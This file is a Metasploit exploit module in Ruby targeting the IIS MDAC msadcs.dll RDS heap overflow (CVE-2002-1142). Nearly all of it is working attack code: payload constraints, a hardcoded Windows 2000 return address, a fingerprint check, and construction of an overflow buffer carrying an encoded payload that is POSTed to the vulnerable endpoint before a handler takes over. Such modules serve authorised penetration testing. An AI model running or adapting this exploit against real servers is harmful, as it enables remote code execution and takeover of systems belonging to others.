# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      &#039;Name&#039;        => &#039;Microsoft IIS MDAC msadcs.dll RDS DataStub Content-Type Overflow&#039;,
      &#039;Description&#039; => %q{
          This module can be used to execute arbitrary code on IIS servers
          that expose the /msadc/msadcs.dll Microsoft Data Access Components
          (MDAC) Remote Data Service (RDS) DataFactory service. The service is
          exploitable even when RDS is configured to deny remote connections
          (handsafe.reg). The service is vulnerable to a heap overflow where
          the RDS DataStub &#039;Content-Type&#039; string is overly long. Microsoft Data
          Access Components (MDAC) 2.1 through 2.6 are known to be vulnerable.
      },
      &#039;Author&#039;      => &#039;patrick&#039;,
      &#039;Version&#039;     => &#039;$Revision$&#039;,
      &#039;Platform&#039;    => &#039;win&#039;,
      &#039;References&#039;  =>
        [
          [&#039;OSVDB&#039;, &#039;14502&#039;],
          [&#039;BID&#039;, &#039;6214&#039;],
          [&#039;CVE&#039;, &#039;2002-1142&#039;],
          [&#039;MSB&#039;, &#039;ms02-065&#039;],
          [&#039;URL&#039;, &#039;http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0082.html&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 1024,
          &#039;BadChars&#039; => "\x00\x09\x0a\x0b\x0d\x20:?<>=$\\/\"&#039;;=+%#&",
          &#039;StackAdjustment&#039; => -3500,
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;seh&#039;, # stops IIS from crashing... hopefully
        },
      &#039;Targets&#039;     =>
        [
          # patrickw tested OK 20120607 w2kpro en sp0 msadcs.dll v2.50.4403.0
          [ &#039;Windows 2000 Pro English SP0&#039;, { &#039;Ret&#039; => 0x75023783 } ], # jmp eax ws2help.dll
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Nov 20 2002&#039;
    )

    register_options(
      [
        OptString.new(&#039;PATH&#039;, [ true,  "The path to msadcs.dll", &#039;/msadc/msadcs.dll&#039;]),
      ], self.class)
  end

  def check
    res = send_request_raw({
        &#039;uri&#039;          =>  datastore[&#039;PATH&#039;],
        &#039;method&#039;       => &#039;GET&#039;,
      })
    if (res and res.code == 200)
      print_status("Server responded with HTTP #{res.code} OK")
      if (res.body =~ /Content-Type: application\/x-varg/)
        print_good("#{datastore[&#039;PATH&#039;]} matches fingerprint application\/x-varg")
        Exploit::CheckCode::Detected
      end
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    sploit = rand_text_alphanumeric(136)
    sploit[24,2] = Rex::Arch::X86.jmp_short(117)
    sploit << [target[&#039;Ret&#039;]].pack(&#039;V&#039;)
    sploit << payload.encoded

    data  = &#039;Content-Type: &#039; + sploit

    res = send_request_raw({
      &#039;uri&#039;          => datastore[&#039;PATH&#039;] + &#039;/AdvancedDataFactory.Query&#039;,
      &#039;headers&#039; =>
        {
          &#039;Content-Length&#039; => data.length,
        },

      &#039;method&#039;       => &#039;POST&#039;,
      &#039;data&#039;         => data,
    })

    handler
  end

end



